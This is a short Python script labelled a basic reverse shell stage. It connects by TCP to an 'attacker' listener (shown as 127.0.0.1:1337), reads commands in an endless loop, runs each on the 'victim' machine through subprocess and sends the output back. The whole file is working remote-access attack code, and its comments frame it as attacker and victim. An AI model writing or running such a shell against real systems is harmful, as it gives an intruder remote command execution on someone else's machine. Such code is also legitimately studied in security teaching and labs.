'''
Basic python reverse shell stage
'''

import socket
import subprocess

# set up a TCP coket for IPv4 address range
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    # make a reverse connection to the attacker
    s.connect(('127.0.0.1', 1337))

    while 1:
        #get response from attacker and decode
        command = s.recv(4096).decode()
        # execute command on victim and get its output
        output = subprocess.getoutput(command)
        #send commands output to attacker
        s.send(output.encode())

        

